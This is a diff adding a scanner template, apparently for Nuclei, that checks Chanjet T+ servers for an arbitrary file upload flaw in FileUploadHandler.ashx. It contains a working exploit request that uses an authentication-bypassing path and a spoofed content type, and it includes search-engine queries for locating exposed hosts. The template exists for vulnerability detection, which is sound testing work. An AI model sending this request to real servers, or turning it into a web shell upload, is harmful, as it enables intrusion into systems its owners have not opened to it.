@@ -1,0 +1,43 @@
+id: changjet-tplus-FileUploadHandler-fileupload-2
+info:
+  name: 畅捷通 T+ FileUploadHandler.ashx - 任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 用友畅捷通-TPlus系统接口FileUploadHandler.ashx存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9A-TPlus%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3FileUploadHandler.ashx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    hunter-query: app.name="畅捷通 T+"
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+  tags: fileupload,changjet,tplus
+
+http:
+  - raw:
+      - |
+        POST /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 180
+        Content-Type: multipart/form-data; boundary=f95ec6be8c3acff8e3edd3d910d3b9a6
+
+        --f95ec6be8c3acff8e3edd3d910d3b9a6
+        Content-Disposition: form-data; name="file"; filename="lead.txt"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        --f95ec6be8c3acff8e3edd3d910d3b9a6--
+      
+      - |+
+        GET /tplus/UserFiles/lead.txt HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
